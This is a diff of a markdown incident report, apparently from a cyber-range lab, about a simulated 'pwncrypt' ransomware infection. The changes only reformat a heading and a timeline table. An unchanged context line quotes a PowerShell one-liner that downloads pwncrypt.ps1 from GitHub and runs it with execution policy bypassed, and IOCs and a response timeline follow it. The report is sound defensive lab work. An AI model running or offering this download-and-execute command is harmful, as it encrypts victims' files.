@@ -114,19 +114,21 @@ Upon reviewing the PowerShell script, it was observed that it performs the follo
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1' -OutFile 'C:\programdata\pwncrypt.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1
 ```
 
-### Observed Behavior: Files on the desktop were encrypted with _pwncrypt added to their names (e.g., report.docx_pwncrypt.docx).
+### Observed Behavior: 
+Files on the desktop were encrypted with _pwncrypt added to their names (e.g., report.docx_pwncrypt.docx).
 #### Indicators of Compromise (IOCs)
 -	File name patterns: *pwncrypt*
 -	Command-line execution from PowerShell
 -	Location: C:\ProgramData\pwncrypt.ps1
 -	Network activity: None observed during encryption window
 ####  Timeline of Events
-Time (UTC)	Event
-17:21:52	.pwncrypt file detected in DeviceFileEvents
-±3 mins	PowerShell script downloaded and executed from GitHub
-Immediate	Files began being encrypted and renamed
-Shortly after	Host fe-vmlab was isolated from the network
 
+| Time (UTC)    | Event                                                 |
+| ------------- | ----------------------------------------------------- |
+| 17:21:52      | `.pwncrypt` file detected in `DeviceFileEvents`       |
+| ±3 mins       | PowerShell script downloaded and executed from GitHub |
+| Immediate     | Files began being encrypted and renamed               |
+| Shortly after | Host `fe-vmlab` was isolated from the network         |
 
 
 ## 6. Response
